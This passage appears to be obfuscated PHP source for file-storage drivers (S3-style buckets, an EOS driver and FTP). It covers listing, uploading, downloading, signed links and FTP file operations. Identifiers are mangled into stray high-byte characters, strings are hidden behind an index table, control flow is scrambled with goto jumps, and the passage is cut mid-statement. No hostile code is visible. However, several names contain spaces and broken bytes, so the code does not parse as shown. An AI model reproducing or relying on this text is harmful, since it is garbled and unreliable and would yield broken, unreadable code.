$cŒØóèŞæ : array(); foreach ($cŒØóèŞæ as $CÉÔ¤ÊÖ–) { if (isset($CÉÔ¤ÊÖ–[$E—Û‘øÆÅ[28]]) && substr($CÉÔ¤ÊÖ–[$E—Û‘øÆÅ[28]], -1) != $E—Û‘øÆÅ[8]) { if (!$a­ŒŒ†çº® && $a¨È±‰ßÊæ) { return !0; } $aæª šÅ˜Õ++; } else { if (isset($CÉÔ¤ÊÖ–[$E—Û‘øÆÅ[183]])) { if (!$a­ŒŒ†çº® && !$a¨È±‰ßÊæ) { return !1; } $aí„Æäºâ²++; } } } goto F„Ì¿¾ïçÉ; DªË£ÖŒ‰: } public function listAll($FôÁéÄ¯ß¶) { $d¶ŸçÚ÷ôÊ =& $_SERVER[÷ÖêïÔÔÓ]; $D‰¹ˆ—†• = $this->listObjs($FôÁéÄ¯ß¶); $FÜîëµÚí¼ = $Có‡­ò¤ƒ = array(); foreach ($D‰¹ˆ—†• as $B‰á¥Ëææà => $dğÈƒõÖŞ) { $FÜîëµÚí¼[] = $dğÈƒõÖŞ[$d¶ŸçÚ÷ôÊ[28]]; $Có‡­ò¤ƒ[$B‰á¥Ëææà] = $dğÈƒõÖŞ[$d¶ŸçÚ÷ôÊ[78]]; } return $this->listAllFiles($FôÁéÄ¯ß¶, $FÜîëµÚí¼, $Có‡­ò¤ƒ); } public function canRead($fÒïË±¢Ø) { $déæƒø×Ğ =& $_SERVER[÷ÖêïÔÔÓ]; $fÜÁêëŸİ = $this->client->getAccessControlPolicy($this->bucket, $fÒïË±¢Ø); if (!$fÜÁêëŸİ) { return !1; } return in_array($fÜÁêëŸİ, array($déæƒø×Ğ[190], $déæƒø×Ğ[191], $déæƒø×Ğ[192])) ? !0 : !1; } public function canWrite($AÆ„ğÑ¹¶Ç) { $eç§½‘ÖÊ =& $_SERVER[÷ÖêïÔÔÓ]; $DĞÉéÎ™ÁŸ = $this->client->getAccessControlPolicy($this->bucket, $AÆ„ğÑ¹¶Ç); if (!$DĞÉéÎ™ÁŸ) { return !1; } return in_array($DĞÉéÎ™ÁŸ, array($eç§½‘ÖÊ[190], $eç§½‘ÖÊ[191])) ? !0 : !1; } public function getContent($b ÙºÂáò‚) { return $this->client->getObject($this->bucket, $b ÙºÂáò‚); } public function setContent($C»âßÌœó¤, $B”Õ‰“ƒ¡œ = '', $A”ù‹ŒŸŞ = false) { goto Eİñ×È»‚; b‘¹àñŒ¾: $fÏ÷Ğğ¿‘¹ = $this->client->putObject($B”Õ‰“ƒ¡œ, $this->bucket, $C»âßÌœó¤, $cöõøÖ¨¸Œ[182], array(), $C´‚Î¦¢Œµ); if (!$fÏ÷Ğğ¿‘¹) { return !1; } if ($A”ù‹ŒŸŞ) { return !0; } goto bÆ‚½ ÷ğ; bÆ‚½ ÷ğ: $fÏ÷Ğğ¿‘¹ = $this->copyFile($C»âßÌœó¤, $C»âßÌœó¤, array($cöõøÖ¨¸Œ[193] => $fÏ÷Ğğ¿‘¹[$cöõøÖ¨¸Œ[194]])); return $fÏ÷Ğğ¿‘¹ ? !0 : !1; goto C£– ÀÍœ²; Eİñ×È»‚: $cöõøÖ¨¸Œ =& $_SERVER[÷ÖêïÔÔÓ]; $C»âßÌœó¤ = $A”ù‹ŒŸŞ ? trim($C»âßÌœó¤, $cöõøÖ¨¸Œ[8]) . $cöõøÖ¨¸Œ[8] : $C»âßÌœó¤; $C´‚Î¦¢Œµ = get_file_mime(get_path_ext($C»âßÌœó¤)); goto b‘¹àñŒ¾; C£– ÀÍœ²: } public function fileSubstr($cØ‹ä¹™„î, $aµêÑíÛ×ë, $FªÍàª¤÷–) { $Eéâ¬’°ê» = $aµêÑíÛ×ë + $FªÍàª¤÷– - 1; return $this->client->getObject($this->bucket, $cØ‹ä¹™„î, array($_SERVER[÷ÖêïÔÔÓ][195] => "\142\171\164\145\163\x3d{$aµêÑíÛ×ë}\55{$Eéâ¬’°ê»}")); } public function upload($A”ôˆ„‘Ò¡, $f²× ÍÚƒ†, $c£à¡Ä¼èĞ = false, $eËÆê¼ØÍõ = REPEAT_REPLACE) { $eå˜†’„ÒØ =& $_SERVER[÷ÖêïÔÔÓ]; $B´¾İ‰²å¼ = array($eå˜†’„ÒØ[193] => @md5_file($f²× ÍÚƒ†)); $BË¬èĞ‡¾† = array($eå˜†’„ÒØ[196] => get_file_mime(get_path_ext($A”ôˆ„‘Ò¡))); if (IO::size($f²× ÍÚƒ†) <= 1024 * 1024 * 200) { $aİå¥ˆ¬ø = $this->client->putObjectFile($f²× ÍÚƒ†, $this->bucket, $A”ôˆ„‘Ò¡, $eå˜†’„ÒØ[182], $B´¾İ‰²å¼, $BË¬èĞ‡¾†); return !empty($aİå¥ˆ¬ø) ? $this->getPathOuter($A”ôˆ„‘Ò¡) : !1; } $CÕô²í×Ò = $this->client->multiUploadObject($f²× ÍÚƒ†, $this->bucket, trim($A”ôˆ„‘Ò¡, $eå˜†’„ÒØ[8]), $B´¾İ‰²å¼, $BË¬èĞ‡¾†); return $CÕô²í×Ò ? $this->getPathOuter($A”ôˆ„‘Ò¡) : !1; } public function download($aÕäÖ¬ˆ, $dğ‰‰ä…µ) { if (!@is_dir($this->pathFather($dğ‰‰ä…µ)) && !IO::mkdir($this->pathFather($dğ‰‰ä…µ))) { return !1; } $fÑè­„á‚¦ = $this->client->getObject($this->bucket, $aÕäÖ¬ˆ, array(), $dğ‰‰ä…µ); return $fÑè­„á‚¦ !== !1 ? $dğ‰‰ä…µ : !1; } public function link($EÃ‰éºÌ» , $f§Èàµ—× = array()) { $c†˜»½²… =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->signVer == $c†˜»½²…[197]) { return $this->client->getAuthenticatedURL($this->bucket, $EÃ‰éºÌ» , 3600 * 12, $f§Èàµ—×); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EÃ‰éºÌ» , $c†˜»½²…[8]), 3600 * 12, $this->region, array(), !0, $f§Èàµ—×); } public function fileOut($b…Ûõ ç×Ö, $e•®ÍóÓ = false, $E¤›½‚Š³Ì = false, $d°·ğŞãñ = '') { goto fÑ˜ˆŞÏà; fÑ˜ˆŞÏà: $d½‹ˆ„Æ¨Œ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$E¤›½‚Š³Ì) { $E¤›½‚Š³Ì = $this->pathThis($b…Ûõ ç×Ö); } $Aå¥ğ¦İ¨¼ = get_file_mime(get_path_ext($E¤›½‚Š³Ì)); goto b¢†—ÓåÄ; b¢†—ÓåÄ: if ($Aå¥ğ¦İ¨¼ == $d½‹ˆ„Æ¨Œ[198]) { return parent::fileOut($b…Ûõ ç×Ö, $e•®ÍóÓ, $E¤›½‚Š³Ì, $d°·ğŞãñ); } $e•®ÍóÓ = $e•®ÍóÓ ? $d½‹ˆ„Æ¨Œ[199] : $d½‹ˆ„Æ¨Œ[200]; $CÒ²‘ÚÏÜå = array($d½‹ˆ„Æ¨Œ[201] => $e•®ÍóÓ . $d½‹ˆ„Æ¨Œ[202] . rawurlencode($E¤›½‚Š³Ì), $d½‹ˆ„Æ¨Œ[203] => $Aå¥ğ¦İ¨¼); goto Dø†Ş‚–î«; Dø†Ş‚–î«: $Bß¼¢¬¥ˆ© = $this->link($b…Ûõ ç×Ö, $CÒ²‘ÚÏÜå); $this->fileOutLink($Bß¼¢¬¥ˆ©); goto DòŸ¬¯©º¡; DòŸ¬¯©º¡: } public function fileOutServer($C¥ƒùœ‡ŞÙ, $FĞğ‰ŸÓÒ‚ = false, $eÕäÁ»ºÇ¨ = false, $dÍˆÌ±‡¬‚ = '') { parent::fileOut($C¥ƒùœ‡ŞÙ, $FĞğ‰ŸÓÒ‚, $eÕäÁ»ºÇ¨, $dÍˆÌ±‡¬‚); } public function fileOutImage($AºÄ³©ßåš, $A•È³¥Ô = 250) { $Bõê¨±ëæê = $this->link($AºÄ³©ßåš); $this->fileOutLink($Bõê¨±ëæê); } public function fileOutImageServer($d¦ÂŒõª¤¨, $e›·…¸‰” = 250) { parent::fileOutImage($d¦ÂŒõª¤¨, $e›·…¸‰”); } public function hashMd5($D­‡Œ‡ˆÔ, $b„¢³Ä²™· = '') { $BÌ¶ƒîÍÖ =& $_SERVER[÷ÖêïÔÔÓ]; $a™ƒÚ©ÎºÌ = $this->objectMeta($D­‡Œ‡ˆÔ); if (!$a™ƒÚ©ÎºÌ) { return !1; } $b„¢³Ä²™· = $b„¢³Ä²™· ? $b„¢³Ä²™· : _get($a™ƒÚ©ÎºÌ, $BÌ¶ƒîÍÖ[204]); $b„¢³Ä²™· = $b„¢³Ä²™· ? $b„¢³Ä²™· : _get($a™ƒÚ©ÎºÌ, $BÌ¶ƒîÍÖ[194], $BÌ¶ƒîÍÖ[33]); return $b„¢³Ä²™·; } public function uploadFormData($E“’ŒâŒ¾, $f‡æÉµÀ¤ = 3600) { $dë—±ÔéÉ„ =& $_SERVER[÷ÖêïÔÔÓ]; $FÀÚ†­°Æ¢ = $this->pathFather($E“’ŒâŒ¾); $dá°­†°Ìë = $this->client->getHttpUploadPostParams($this->bucket, $FÀÚ†­°Æ¢, $dë—±ÔéÉ„[182], $f‡æÉµÀ¤); return array_merge((array) $dá°­†°Ìë, array($dë—±ÔéÉ„[166] => $this->getHost())); } public function multiUploadFormData($fåôÈÆÃÕ‡, $FÎˆÙ„í‹ = 3600) { $DĞ½–²ÔŸ· =& $_SERVER[÷ÖêïÔÔÓ]; $B¬¤øõ¸Ó = gmdate($DĞ½–²ÔŸ·[205]); $bì‰˜ßŒ¯Ê = array(); $BŠ»•´ = $this->client->getUploadId($this->bucket, $fåôÈÆÃÕ‡, $bì‰˜ßŒ¯Ê); if (!$BŠ»•´) { return !1; } return array($DĞ½–²ÔŸ·[206] => $BŠ»•´, $DĞ½–²ÔŸ·[166] => $this->getHost() . $DĞ½–²ÔŸ·[8] . $this->pathEncode($fåôÈÆÃÕ‡), $DĞ½–²ÔŸ·[207] => $B¬¤øõ¸Ó, $DĞ½–²ÔŸ·[88] => $fåôÈÆÃÕ‡); } public function multiUploadAuthData($cßÍ³Ù‹½, $f„ïŠÚ = array()) { goto fñŸĞøç™­; cäñ‰·Ü: if (isset($f„ïŠÚ[$cÑ“ Ôø˜Œ[212]]) && $f„ïŠÚ[$cÑ“ Ôø˜Œ[212]] == $cÑ“ Ôø˜Œ[213]) { $B£§ÒÆ¯Ÿ[0] = $cÑ“ Ôø˜Œ[213]; } $DÑ¯æ¸ó° = implode($cÑ“ Ôø˜Œ[214], $B£§ÒÆ¯Ÿ); $C±©ŞÉÂà¶ = base64_encode(hash_hmac($cÑ“ Ôø˜Œ[215], $DÑ¯æ¸ó°, $this->secret, !0)); goto B›Ö ÏÖõâ; B›Ö ÏÖõâ: $bÆ•¬‘„—¼ = $cÑ“ Ôø˜Œ[216] . $this->accessKey . $cÑ“ Ôø˜Œ[4] . $C±©ŞÉÂà¶; if (strpos($B”‚â©ÜÑÄ, $cÑ“ Ôø˜Œ[210]) === 0) { return array($cÑ“ Ôø˜Œ[217] => $bÆ•¬‘„—¼, $cÑ“ Ôø˜Œ[207] => $Aœ¥–µÜ†¶); } return $bÆ•¬‘„—¼; goto cë¿¯é«Õ; fñŸĞøç™­: $cÑ“ Ôø˜Œ =& $_SERVER[÷ÖêïÔÔÓ]; $Aœ¥–µÜ†¶ = isset($f„ïŠÚ[$cÑ“ Ôø˜Œ[207]]) ? $f„ïŠÚ[$cÑ“ Ôø˜Œ[207]] : gmdate($cÑ“ Ôø˜Œ[205]); $f„ïŠÚ[$cÑ“ Ôø˜Œ[207]] = $Aœ¥–µÜ†¶; goto Eõ™ªÊ¶×; CŸ—ôÊ¬ÇŠ: if (isset($f„ïŠÚ[$cÑ“ Ôø˜Œ[208]])) { return $this->listUploadParts($fŒß«¡ÄÊã, $f„ïŠÚ); } $B£§ÒÆ¯Ÿ = array($cÑ“ Ôø˜Œ[209], $cÑ“ Ôø˜Œ[33], $cÑ“ Ôø˜Œ[115], $cÑ“ Ôø˜Œ[33], "\170\55\141\x6d\172\x2d\x64\141\164\145\x3a{$Aœ¥–µÜ†¶}", $cÑ“ Ôø˜Œ[8] . $this->bucket . $cÑ“ Ôø˜Œ[8] . $this->pathEncode($fŒß«¡ÄÊã) . $B”‚â©ÜÑÄ); if (strpos($B”‚â©ÜÑÄ, $cÑ“ Ôø˜Œ[210]) === 0) { $B£§ÒÆ¯Ÿ[0] = $cÑ“ Ôø˜Œ[211]; } goto cäñ‰·Ü; Eõ™ªÊ¶×: $B”‚â©ÜÑÄ = isset($f„ïŠÚ[$cÑ“ Ôø˜Œ[157]]) ? $f„ïŠÚ[$cÑ“ Ôø˜Œ[157]] : $cÑ“ Ôø˜Œ[33]; $fŒß«¡ÄÊã = $f„ïŠÚ[$cÑ“ Ôø˜Œ[88]]; unset($f„ïŠÚ[$cÑ“ Ôø˜Œ[88]]); goto CŸ—ôÊ¬ÇŠ; cë¿¯é«Õ: } public function listUploadParts($fĞôôŒ†, $dñÈ¢¶íÖÏ = array()) { goto a‚Ş…Ê‹Ÿ; bè—éƒ¥Ä: $c‹Î£Ó—ª­ = $this->multiUploadAuthData($fĞôôŒ†, $dñÈ¢¶íÖÏ); if (empty($c‹Î£Ó—ª­)) { return !1; } return array($f‚Òƒ¿Õ [217] => $c‹Î£Ó—ª­, $f‚Òƒ¿Õ [207] => $dñÈ¢¶íÖÏ[$f‚Òƒ¿Õ [207]], $f‚Òƒ¿Õ [219] => $D»ÓÌÔ‚”); goto e…Òó…§¬; DÙ˜ï“¯š—: if (!$D»ÓÌÔ‚”) { return !1; } unset($dñÈ¢¶íÖÏ[$f‚Òƒ¿Õ [208]], $dñÈ¢¶íÖÏ[$f‚Òƒ¿Õ [212]]); $dñÈ¢¶íÖÏ[$f‚Òƒ¿Õ [88]] = $fĞôôŒ†; goto bè—éƒ¥Ä; a‚Ş…Ê‹Ÿ: $f‚Òƒ¿Õ  =& $_SERVER[÷ÖêïÔÔÓ]; $dæ»ÈƒÀ·ˆ = str_replace($f‚Òƒ¿Õ [218], $f‚Òƒ¿Õ [33], $dñÈ¢¶íÖÏ[$f‚Òƒ¿Õ [157]]); $D»ÓÌÔ‚” = $this->client->listParts($this->bucket, $fĞôôŒ†, $dæ»ÈƒÀ·ˆ); goto DÙ˜ï“¯š—; e…Òó…§¬: } public function getHost() { return parent::getHost() . $_SERVER[÷ÖêïÔÔÓ][8] . $this->bucket; } public function size($B¤±»à Á) { $DñÂ¨›––… = $this->objectMeta($B¤±»à Á); return $DñÂ¨›––… ? $DñÂ¨›––…[$_SERVER[÷ÖêïÔÔÓ][78]] : 0; } public function info($DºÑ”…´ë‰) { if ($this->isFolder($DºÑ”…´ë‰)) { return $this->folderInfo($DºÑ”…´ë‰); } else { if ($this->isFile($DºÑ”…´ë‰)) { return $this->fileInfo($DºÑ”…´ë‰); } } return !1; } public function exist($Fîîè¿²À¶) { return $this->isFile($Fîîè¿²À¶) || $this->isFolder($Fîîè¿²À¶); } public function isFile($d×‰â“Üå) { return !$this->isFolder($d×‰â“Üå) && $this->objectMeta($d×‰â“Üå); } public function isFolder($FßäƒğõÂ„) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][220], $FßäƒğõÂ„); } protected function objectMeta($eØ²Õî¹Á) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][221], $eØ²Õî¹Á); } protected function _objectMeta($b§á² –Ü¸) { $a°Òâ©¶‚ =& $_SERVER[÷ÖêïÔÔÓ]; try { $e­Ó¬ôù—Ğ = $this->client->getObjectInfo($this->bucket, $b§á² –Ü¸); if (!isset($e­Ó¬ôù—Ğ[$a°Òâ©¶‚[204]]) && isset($e­Ó¬ôù—Ğ[$a°Òâ©¶‚[222]])) { $e­Ó¬ôù—Ğ[$a°Òâ©¶‚[204]] = $e­Ó¬ôù—Ğ[$a°Òâ©¶‚[222]]; } } catch (OSS\Core\OssException $B¿¼—É‰’) { $e­Ó¬ôù—Ğ = !1; } return $e­Ó¬ôù—Ğ; } protected function _isFolder($aÖ–³ƒÃ¥‹) { $b­¯„»”…¡ = $this->listObjs($aÖ–³ƒÃ¥‹, null, 1); return !empty($b­¯„»”…¡) ? !0 : !1; } } define($_SERVER[÷ÖêïÔÔÓ][223], 1); goto B©Û‹êŠõŞ; Dë­¯Šù«: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($a­÷—ĞÔ´İ) { parent::__construct($a­÷—ĞÔ´İ); $this->signatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } public function uploadFormData($B¢µÏùëÏ, $D‹šÙ‡‘åÚ = 3600) { goto F‚ŸÁ÷ŞïÕ; AáñğöŒ : $Aà°ù³º­Ë = $aÃİ±ˆ¤µâ[59]; $C§íÜ‚ „Ã = gmdate($aÃİ±ˆ¤µâ[1093]); $D±ßÌá•…¦ = gmdate($aÃİ±ˆ¤µâ[676]); goto fÖ©ŒêÓÀ§; eò·­ã¹ø•: $C›±°¸¨§° = array($aÃİ±ˆ¤µâ[196] => $aÃİ±ˆ¤µâ[33], $aÃİ±ˆ¤µâ[1104] => $aÃİ±ˆ¤µâ[33], $aÃİ±ˆ¤µâ[1066] => $E—±ëÍ˜¿‘, $aÃİ±ˆ¤µâ[1070] => $eÎâ‰‡Ôš, $aÃİ±ˆ¤µâ[1074] => $bì¬°İ©·, $aÃİ±ˆ¤µâ[1105] => $FªÒ†ƒÛ¿®, $aÃİ±ˆ¤µâ[1106] => $dí’°³Û‘È, $aÃİ±ˆ¤µâ[1107] => $C§íÜ‚ „Ã, $aÃİ±ˆ¤µâ[1108] => $Dãğ»¼ÊÍ¸, $aÃİ±ˆ¤µâ[1109] => $EÈØŒ—¼Èã, $aÃİ±ˆ¤µâ[166] => $this->getHost()); return $C›±°¸¨§°; goto d¯ÎÍõ•Å•; f¢ï²ƒËå…: $dõÅ§­Ğ‘• = hash_hmac($aÃİ±ˆ¤µâ[1102], $Aà°ù³º­Ë, $Fˆ®©§ˆŒ, !0); $BÇ²ĞˆÉÖ„ = hash_hmac($aÃİ±ˆ¤µâ[1102], $EŞ‘Îğ¬êè, $dõÅ§­Ğ‘•, !0); $EÈØŒ—¼Èã = hash_hmac($aÃİ±ˆ¤µâ[1102], $bì¬°İ©·, $BÇ²ĞˆÉÖ„); goto eò·­ã¹ø•; fÖ©ŒêÓÀ§: $EŞ‘Îğ¬êè = $aÃİ±ˆ¤µâ[1094]; $Dãğ»¼ÊÍ¸ = $D‹šÙ‡‘åÚ . $aÃİ±ˆ¤µâ[33]; $eÎâ‰‡Ôš = $aÃİ±ˆ¤µâ[1062]; goto aœš‹Òœø°; aœš‹Òœø°: $e«î±óğÅÅ = array($this->accessKey, $D±ßÌá•…¦, $this->region, $Aà°ù³º­Ë, $EŞ‘Îğ¬êè); $FªÒ†ƒÛ¿® = implode($aÃİ±ˆ¤µâ[8], $e«î±óğÅÅ); $Aâ¹–¥¥Ü– = array($aÃİ±ˆ¤µâ[1064] => gmdate($aÃİ±ˆ¤µâ[1063], strtotime($aÃİ±ˆ¤µâ[1095])), $aÃİ±ˆ¤µâ[1065] => array(array($aÃİ±ˆ¤µâ[1067] => $this->bucket), array($aÃİ±ˆ¤µâ[1066] => $E—±ëÍ˜¿‘), array($aÃİ±ˆ¤µâ[1068], $aÃİ±ˆ¤µâ[1069], $aÃİ±ˆ¤µâ[33]), array($aÃİ±ˆ¤µâ[1068], $aÃİ±ˆ¤µâ[1096], $aÃİ±ˆ¤µâ[33]), array($aÃİ±ˆ¤µâ[1068], $aÃİ±ˆ¤µâ[1097], $aÃİ±ˆ¤µâ[33]), array($aÃİ±ˆ¤µâ[1070] => $eÎâ‰‡Ôš), array($aÃİ±ˆ¤µâ[1098] => $FªÒ†ƒÛ¿®), array($aÃİ±ˆ¤µâ[1099] => $dí’°³Û‘È), array($aÃİ±ˆ¤µâ[1100] => $C§íÜ‚ „Ã), array($aÃİ±ˆ¤µâ[1101] => $Dãğ»¼ÊÍ¸))); goto EÖÛîÑÔ‘; EÖÛîÑÔ‘: $bì¬°İ©· = base64_encode(json_encode($Aâ¹–¥¥Ü–)); $BÑÄ ç‡ôĞ = hash_hmac($aÃİ±ˆ¤µâ[1102], $D±ßÌá•…¦, $aÃİ±ˆ¤µâ[1103] . $this->secret, !0); $Fˆ®©§ˆŒ = hash_hmac($aÃİ±ˆ¤µâ[1102], $this->region, $BÑÄ ç‡ôĞ, !0); goto f¢ï²ƒËå…; F‚ŸÁ÷ŞïÕ: $aÃİ±ˆ¤µâ =& $_SERVER[÷ÖêïÔÔÓ]; $E—±ëÍ˜¿‘ = $aÃİ±ˆ¤µâ[182]; $dí’°³Û‘È = $aÃİ±ˆ¤µâ[1092]; goto AáñğöŒ ; d¯ÎÍõ•Å•: } public function fileOutLink($c©µ¥Ç÷”Û) { header($_SERVER[÷ÖêïÔÔÓ][153] . $c©µ¥Ç÷”Û); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($aµ¶›Ñôçê) { parent::__construct(); if (count($aµ¶›Ñôçê) > 0) { $this->_init($aµ¶›Ñôçê); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B­ñ¶ØÁ±) { $f»¿—İÒ‹À =& $_SERVER[÷ÖêïÔÔÓ]; global $config; $this->appCharset = $config[$f»¿—İÒ‹À[1110]]; $this->systemCharset = $config[$f»¿—İÒ‹À[1111]]; if (isset($B­ñ¶ØÁ±[$f»¿—İÒ‹À[1112]]) && $B­ñ¶ØÁ±[$f»¿—İÒ‹À[1112]]) { $this->systemCharset = $B­ñ¶ØÁ±[$f»¿—İÒ‹À[1112]]; } } public function iconvApp($E¼ñİáËƒõ) { return $this->iconvTo($E¼ñİáËƒõ, $this->systemCharset, $this->appCharset); } public function iconvSystem($bö´™Ç˜©Ú) { return $this->iconvTo($bö´™Ç˜©Ú, $this->appCharset, $this->systemCharset); } public function getPathOuter($c°‹´®×µ­) { goto B°òÃÌŞì‚; AŸÇ­ÏäÉ—: return $this->pathDriver . $aŞˆŒƒš’[8] . ltrim($c°‹´®×µ­, $aŞˆŒƒš’[8]); goto Fä®”óÚˆÎ; C«Àœ§ìµ¼: if (substr($Aõ£òÖ¹Ğ×, 0, 2) == $aŞˆŒƒš’[1113]) { $Aõ£òÖ¹Ğ× = BASIC_PATH . substr($Aõ£òÖ¹Ğ×, 2); } if (substr($c°‹´®×µ­, 0, 2) == $aŞˆŒƒš’[1113]) { $c°‹´®×µ­ = BASIC_PATH . substr($c°‹´®×µ­, 2); } $Aõ£òÖ¹Ğ× = KodIO::clear($Aõ£òÖ¹Ğ×); goto fó¿‰²‚‰ù; fó¿‰²‚‰ù: $c°‹´®×µ­ = KodIO::clear($c°‹´®×µ­); $c°‹´®×µ­ = substr($c°‹´®×µ­, strlen($Aõ£òÖ¹Ğ×)); if (empty($this->pathDriver)) { return $c°‹´®×µ­; } goto AŸÇ­ÏäÉ—; B°òÃÌŞì‚: $aŞˆŒƒš’ =& $_SERVER[÷ÖêïÔÔÓ]; $Aõ£òÖ¹Ğ× = $this->iconvApp($this->pathBase); $c°‹´®×µ­ = $this->iconvApp($c°‹´®×µ­); goto C«Àœ§ìµ¼; Fä®”óÚˆÎ: } private function _init($C‚ñ‡®™ÓÆ = array()) { goto D‡‰ƒï×›¨; D‡‰ƒï×›¨: $C®Î¹Œ¤‹“ =& $_SERVER[÷ÖêïÔÔÓ]; if (!function_exists($C®Î¹Œ¤‹“[1114])) { show_json(LNG($C®Î¹Œ¤‹“[1115]), !1); } $this->charsetReset($C‚ñ‡®™ÓÆ); goto BØôˆ°ó±Š; BØôˆ°ó±Š: foreach ($C‚ñ‡®™ÓÆ as $B¶­É²éœ => $fö‹’È±ƒ) { if (isset($this->{$B¶­É²éœ})) { $this->{$B¶­É²éœ} = $fö‹’È±ƒ; } } static $a”ÒîãÜÙô = array(); $c¤ëÌÒ÷ = md5(json_encode($C‚ñ‡®™ÓÆ)); goto FØƒÛôà•ñ; EÎ–àŒ‹Í¨: return $EÑë¯–˜¾; goto aóÇ²ç­‹Ñ; c£¨¤¦Óê: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $a”ÒîãÜÙô[$c¤ëÌÒ÷] = array($C®Î¹Œ¤‹“[1119] => $this->connect, $C®Î¹Œ¤‹“[166] => $this->host, $C®Î¹Œ¤‹“[165] => $this->scheme, $C®Î¹Œ¤‹“[167] => $this->port); goto EÎ–àŒ‹Í¨; aÒôÏ«´Æì: $A­Í¬ì¶Àá = isset($fÂ¸ÄôŠ’[$C®Î¹Œ¤‹“[165]]) && $fÂ¸ÄôŠ’[$C®Î¹Œ¤‹“[165]] == $C®Î¹Œ¤‹“[1116] ? !0 : !1; $this->scheme = $A­Í¬ì¶Àá ? $C®Î¹Œ¤‹“[1117] : $C®Î¹Œ¤‹“[1118]; $this->port = isset($fÂ¸ÄôŠ’[$C®Î¹Œ¤‹“[167]]) ? $fÂ¸ÄôŠ’[$C®Î¹Œ¤‹“[167]] : 21; goto D‰£ƒ°·ò°; D‰£ƒ°·ò°: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $EÑë¯–˜¾ = @ftp_login($this->connect, $this->username, $this->userpass); goto c£¨¤¦Óê; FØƒÛôà•ñ: if (isset($a”ÒîãÜÙô[$c¤ëÌÒ÷])) { foreach ($a”ÒîãÜÙô[$c¤ëÌÒ÷] as $B¶­É²éœ => $fö‹’È±ƒ) { $this->{$B¶­É²éœ} = $fö‹’È±ƒ; } return !0; } $fÂ¸ÄôŠ’ = parse_url(trim($this->server, $C®Î¹Œ¤‹“[8])); $this->host = $fÂ¸ÄôŠ’[$C®Î¹Œ¤‹“[166]]; goto aÒôÏ«´Æì; aóÇ²ç­‹Ñ: } private function _isconn() { return is_resource($this->connect); } public function mkfile($E½å¶„¯¯˜, $D¨²·äòÚƒ = '', $D¸ƒßÎ‚¹Ò = REPEAT_RENAME) { if ($this->setContent($E½å¶„¯¯˜, $D¨²·äòÚƒ)) { return $this->getPathOuter($E½å¶„¯¯˜); } return !1; } public function mkdir($Eá’¬¡Û½…, $AæìŸ³˜¦­ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Eá’¬¡Û½… = $this->iconvSystem($Eá’¬¡Û½…); if ($this->isFolder($Eá’¬¡Û½…) || @ftp_mkdir($this->connect, $Eá’¬¡Û½…)) { return $this->getPathOuter($Eá’¬¡Û½…); } if (!$this->mkdir($this->pathFather($Eá’¬¡Û½…))) { return !1; } if ($Eá’¬¡Û½… = @ftp_mkdir($this->connect, $Eá’¬¡Û½…)) { return $this->getPathOuter($Eá’¬¡Û½…); } return !1; } public function copyFile($E…îŸ™ÙÕù, $eá†ğøÎ†–) { goto cêß”ª‚ğÜ; b¥°’ÜË¦â: $this->tempFileRemve($DÉ‰Ç»â¦‹); return $FÊåóô‚’; goto DäËÉ‘±ã; cêß”ª‚ğÜ: if (!$this->_isconn()) { return !1; } $c¸ôù¦†×ğ = $this->pathThis($this->iconvSystem($E…îŸ™ÙÕù)); $DÉ‰Ç»â¦‹ = $this->tempFile($c¸ôù¦†×ğ); goto F÷¸šØË‚§; F÷¸šØË‚§: $BèØÇ‹Ş¶ = $this->iconvApp($DÉ‰Ç»â¦‹); $this->download($E…îŸ™ÙÕù, $BèØÇ‹Ş¶); $FÊåóô‚’ = $this->upload($eá†ğøÎ†–, $BèØÇ‹Ş¶); goto b¥°’ÜË¦â; DäËÉ‘±ã: } public function moveFile($fğÇï„ó, $eÙƒ“øÁÅ®) { if (!$this->_isconn()) { return !1; } $fğÇï„ó = $this->iconvSystem($fğÇï„ó); $eÙƒ“øÁÅ® = $this->iconvSystem($eÙƒ“øÁÅ®); $a‰ÉíŞÇø¥ = @ftp_rename($this->connect, $fğÇï„ó, $eÙƒ“øÁÅ®); return $a‰ÉíŞÇø¥ ? $this->getPathOuter($eÙƒ“øÁÅ®) : !1; } public function delFile($d½ÓÁ¡ÌÆ) { if (!$this->_isconn()) { return !1; } $d½ÓÁ¡ÌÆ = $this->iconvSystem($d½ÓÁ¡ÌÆ); return @ftp_delete($this->connect, $d½ÓÁ¡ÌÆ); } public function delFolder($A•Ñ™¶¸‡“) { if (!$this->_isconn()) { return !1; } $A•Ñ™¶¸‡“ = $this->iconvSystem($A•Ñ™¶¸‡“); $E’×¼†ßˆÇ = $this->ftpList($A•Ñ™¶¸‡“); if (!$E’×¼†ßˆÇ) { return @ftp_rmdir($this->connect, $A•Ñ™¶¸‡“); } foreach ($E’×¼†ßˆÇ as $cÚêƒÓ·„) { if ($this->isFolder($cÚêƒÓ·„)) { $cÚêƒÓ·„ = $this->iconvApp($cÚêƒÓ·„); $this->delFolder($cÚêƒÓ·„); } else { @ftp_delete($this->connect, $cÚêƒÓ·„); } } return @ftp_rmdir($this->connect, $A•Ñ™¶¸‡“); } public function rename($e‹š¼ƒ¡™‡, $E¾öêÊ§…İ) { goto DÏ¸ë¯“à„; eµìÒæËí‹: return $cÊšºçŒ‹É ? $this->getPathOuter($F¼¤·§Ë®) : !1; goto aø‰¤ã¯¹Œ; DÏ¸ë¯“à„: $aäÈÇö´Ùç =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->_isconn()) { return !1; } $b½éË£ù = $this->fileNameAuto($this->pathFather($e‹š¼ƒ¡™‡), $E¾öêÊ§…İ); goto fØ˜¿ÌÒ; fØ˜¿ÌÒ: $b½éË£ù = $this->iconvSystem($b½éË£ù); $e‹š¼ƒ¡™‡ = $this->iconvSystem($e‹š¼ƒ¡™‡); $D¹ÍË®ÛÚÚ = 